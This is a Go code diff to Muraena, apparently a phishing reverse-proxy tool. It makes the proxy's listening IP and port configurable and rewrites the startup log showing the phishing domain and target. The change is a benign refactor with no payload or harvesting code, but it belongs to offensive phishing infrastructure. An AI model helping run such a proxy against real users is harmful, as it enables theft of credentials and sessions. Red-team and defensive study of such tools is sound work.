@@ -101,26 +101,30 @@ func main() {
 		s.HandleFood(w, r)
 	})
 
+
+
+
+	listeningAddress := fmt.Sprintf("%s:%d", sess.Config.Proxy.Listener.IP, sess.Config.Proxy.Listener.Port)
+	lline := fmt.Sprintf("Muraena is alive on %s\n[ %s ] ==> [ %s ]", tui.Green(listeningAddress),
+		tui.Yellow(sess.Config.Proxy.Phishing), tui.Green(sess.Config.Proxy.Target))
+	log.Info(lline)
+
 	if sess.Config.TLS.Enabled {
-		lline := fmt.Sprintf("Muraena Reverse Proxy waiting for food on HTTPS...\n[ %s ] ==> [ %s ]",
-			tui.Yellow(sess.Config.Proxy.Phishing), tui.Green(sess.Config.Proxy.Target))
-		log.Info(lline)
 		tlsServer := &TLSServer{
 			Cert:     sess.Config.TLS.Certificate,
 			Key:      sess.Config.TLS.Key,
 			CertPool: sess.Config.TLS.Root,
 		}
 
-		if err := tlsServer.ServeTLS(fmt.Sprintf("%s:443", "0.0.0.0")); err != nil {
+		if err := tlsServer.ServeTLS(listeningAddress); err != nil {
 			log.Fatal("Error binding Muraena on HTTPS: %s", err)
 		}
 	} else {
-		muraena := &http.Server{Addr: fmt.Sprintf("%s:80", "0.0.0.0")}
-		lline := fmt.Sprintf("Muraena Reverse Proxy waiting for food on HTTP...\n[ %s ] ==> [ %s ]",
-			tui.Yellow(sess.Config.Proxy.Phishing), tui.Green(sess.Config.Proxy.Target))
-		log.Info(lline)
+		muraena := &http.Server{Addr: listeningAddress}
 		if err := muraena.ListenAndServe(); err != nil {
 			log.Fatal("Error binding Muraena on HTTP: %s", err)
 		}
 	}
+
+
 }
